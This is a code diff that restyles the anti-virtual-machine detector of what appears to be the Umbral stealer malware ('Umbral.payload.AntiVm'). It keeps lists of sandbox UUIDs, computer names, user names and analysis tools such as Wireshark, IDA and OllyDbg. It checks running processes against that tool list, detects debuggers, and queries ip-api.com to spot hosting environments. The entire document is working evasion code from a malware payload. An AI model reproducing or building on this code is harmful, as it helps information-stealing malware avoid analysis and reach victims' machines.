@@ -8,7 +8,7 @@ namespace Umbral.payload.AntiVm
 {
     internal static class Detector
     {
-        private static readonly string[] BlacklistedUuids =
+        static private readonly string[] BlacklistedUuids =
         {
             "7AB5C494-39F5-4941-9163-47F54D6D5016", "032E02B4-0499-05C3-0806-3C0700080009",
             "03DE0294-0480-05DE-1A06-350700080009", "11111111-2222-3333-4444-555555555555",
@@ -29,7 +29,7 @@ namespace Umbral.payload.AntiVm
             "9961A120-E691-4FFE-B67B-F0E4115D5919"
         };
 
-        private static readonly string[] BlacklistedComputernames =
+        static private readonly string[] BlacklistedComputernames =
         {
             "bee7370c-8c0c-4", "desktop-nakffmt", "win-5e07cos9alr", "b30f0242-1c6a-4", "desktop-vrsqlag", "q9iatrkprh",
             "xc64zb", "desktop-d019gdm", "desktop-wi8clet", "server1", "lisa-pc", "john-pc", "desktop-b0t93d6",
@@ -38,14 +38,14 @@ namespace Umbral.payload.AntiVm
             "compname_5076", "desktop-vkeons4", "NTT-EFF-2W11WSS"
         };
 
-        private static readonly string[] BlacklistedUsers =
+        static private readonly string[] BlacklistedUsers =
         {
             "wdagutilityaccount", "abby", "peter wilson", "hmarc", "patex", "john-pc", "rdhj0cnfevzx", "keecfmwgj",
             "frank", "8nl0colnq5bq", "lisa", "john", "george", "pxmduopvyx", "8vizsm", "w0fjuovmccp5a", "lmvwjj9b",
             "pqonjhvwexss", "3u2v9m8", "julia", "heuerzl", "harry johnson", "j.seance", "a.monaldo", "tvm"
         };
 
-        private static readonly string[] BlacklistedTasks =
+        static private readonly string[] BlacklistedTasks =
         {
             "fakenet", "dumpcap", "httpdebuggerui", "wireshark", "fiddler", "vboxservice", "df5serv", "vboxtray",
             "vmtoolsd", "vmwaretray", "ida64", "ollydbg", "pestudio", "vmwareuser", "vgauthservice", "vmacthlp",
@@ -60,15 +60,15 @@ namespace Umbral.payload.AntiVm
                    CheckRunningProcesses() || CheckDebugger();
         }
 
-        private static bool CheckDebugger()
+        static private bool CheckDebugger()
         {
             return Debugger.IsAttached && !Syscalls.IsConsoleVisible();
         }
 
-        private static bool CheckSystemUuid()
+        static private bool CheckSystemUuid()
         {
             string uuid;
-            using (var process = new Process())
+            using (Process process = new Process())
             {
                 process.StartInfo.FileName = "wmic.exe";
                 process.StartInfo.Arguments = "csproduct get uuid";
@@ -85,10 +85,10 @@ namespace Umbral.payload.AntiVm
             return BlacklistedUuids.Contains(uuid);
         }
 
-        private static bool CheckRunningProcesses()
+        static private bool CheckRunningProcesses()
         {
             var processes = Process.GetProcesses();
-            foreach (var process in processes)
+            foreach (Process process in processes)
                 if (BlacklistedTasks.Contains(process.ProcessName.ToLower()))
                     try
                     {
@@ -102,25 +102,25 @@ namespace Umbral.payload.AntiVm
             return false;
         }
 
-        private static bool CheckUsername()
+        static private bool CheckUsername()
         {
-            var isBlacklistedUser = BlacklistedUsers.Contains(Environment.UserName);
+            bool isBlacklistedUser = BlacklistedUsers.Contains(Environment.UserName);
             return isBlacklistedUser;
         }
 
-        private static bool CheckComputerName()
+        static private bool CheckComputerName()
         {
-            var blacklistedComputername = BlacklistedComputernames.Contains(Environment.MachineName);
+            bool blacklistedComputername = BlacklistedComputernames.Contains(Environment.MachineName);
             return blacklistedComputername;
         }
 
-        private static bool CheckHosting()
+        static private bool CheckHosting()
         {
             try
             {
-                using (var wc = new WebClient())
+                using (WebClient wc = new WebClient())
                 {
-                    var isHosting = wc.DownloadString("http://ip-api.com/line/?fields=hosting").Trim() == "true";
+                    bool isHosting = wc.DownloadString("http://ip-api.com/line/?fields=hosting").Trim() == "true";
                     return isHosting;
                 }
             }
